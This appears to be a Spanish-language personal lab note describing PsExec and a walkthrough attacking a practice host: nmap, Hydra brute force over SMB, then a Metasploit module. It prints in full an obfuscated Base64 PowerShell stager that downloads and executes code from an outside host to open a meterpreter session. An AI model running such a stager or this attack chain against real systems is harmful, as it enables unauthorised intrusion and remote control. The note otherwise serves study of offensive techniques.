
Herramienta que permite ejecutar comandos en dispositivos windows remotos. Usada por administradores de sistemas, aunque, dada su capacidad para ehecutar comandos con privilegios elevados también se ha convertido en una herramienta popular de ataque.

Como funciona:

1. Conexión con SMB
	1. PsExec establece conexión remota usando SMB
	2. Suele requerir de credenciales de autenticación ya sea contraseñas o hashes.
2. Tubería
	1. PsExec crea una tubería en el sistema remoto para facilitar la conexión del cliente local y el remoto.
3. Servicio Temporal
	1. Para ejecutar comandos en el sistema remoto. PsExec crea un servicio de Windows Temporal
	2. Ese servicio se ejecuta con privilegios elevados, permitiendo ejecutar comandos como un administrador de sistemas.
4. Ejecución y limpieza
	1. Una vez el comando o script ha sido ejecutado. PsExec limpia eliminando el servicio temporal. Algunas trazas como logs pueden mantenerse.

Es posible que se requiera de un passwd adicional para acceder a un recurso.

Ejemplo de funcionamiento:

Nos dan de ip objetivo la 10.2.16.137

El primer paso que haríamos es ejecutar un nmap:

![[Pasted image 20250226095158.png]]

Por lo que se puede observar hay un NetBios y un SMB en el 445. 

![[Pasted image 20250226095357.png]]

Con la ejecución de smb-protocols podemos observar los protocolos que permite el host

Seguimos con la herramienta de hydra para hacer un ataque de fuerza bruta. Como hemos visto que utiliza el SMB2 es importante incluirlo.

![[Pasted image 20250226095716.png]]

Ahora es cuando podemos probar de autenticarnos con PsExec.

![[Pasted image 20250226100918.png]]

Vamos a utilizar un módulo de metasploit con la siguiente configuración:

![[Pasted image 20250226101405.png]]

Una vez le demos a exploit nos generará un comando para ejecutar dentro del SMB.

```pws
powershell.exe -nop -w hidden -e WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbAA9AFsATgBlAHQALgBTAGUAYwB1AHIAaQB0AHkAUAByAG8AdABvAGMAbwBsAFQAeQBwAGUAXQA6ADoAVABsAHMAMQAyADsAJABOAD0AbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAOwBpAGYAKABbAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBQAHIAbwB4AHkAXQA6ADoARwBlAHQARABlAGYAYQB1AGwAdABQAHIAbwB4AHkAKAApAC4AYQBkAGQAcgBlAHMAcwAgAC0AbgBlACAAJABuAHUAbABsACkAewAkAE4ALgBwAHIAbwB4AHkAPQBbAE4AZQB0AC4AVwBlAGIAUgBlAHEAdQBlAHMAdABdADoAOgBHAGUAdABTAHkAcwB0AGUAbQBXAGUAYgBQAHIAbwB4AHkAKAApADsAJABOAC4AUAByAG8AeAB5AC4AQwByAGUAZABlAG4AdABpAGEAbABzAD0AWwBOAGUAdAAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAQwBhAGMAaABlAF0AOgA6AEQAZQBmAGEAdQBsAHQAQwByAGUAZABlAG4AdABpAGEAbABzADsAfQA7AEkARQBYACAAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4ANAAxAC4ANAA6ADgAMAA4ADAALwBXAFMAQwBZAFcAMgBJAC8ANgA5AFMARABsADgAYgBRAEQARgAzAEQAUABRADAAJwApACkAOwBJAEUAWAAgACgAKABuAGUAdwAtAG8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADQAMQAuADQAOgA4ADAAOAAwAC8AVwBTAEMAWQBXADIASQAnACkAKQA7AA==
```

una vez ejecutado el comando en la máquina victima nos aparecerá una sesión de meterpreter.

![[Pasted image 20250226101620.png]]

